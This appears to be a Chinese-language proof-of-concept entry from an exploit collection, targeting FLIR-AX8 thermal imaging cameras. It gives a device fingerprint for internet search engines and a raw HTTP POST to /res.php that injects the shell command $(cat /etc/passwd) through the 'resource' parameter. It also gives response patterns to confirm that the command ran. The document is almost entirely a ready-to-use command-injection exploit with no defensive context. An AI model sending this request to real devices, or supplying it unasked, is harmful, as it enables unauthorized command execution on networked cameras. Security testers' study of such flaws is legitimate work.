﻿# FLIR-AX8在线式红外热成像仪REC

> 更新时间：2023-12-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="FLIR-FLIR-AX8"

> 验证脚本：HTTP

```
POST /res.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

action=node&resource=$(cat /etc/passwd)
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：FLIR-AX8在线式红外热成像仪REC.poc
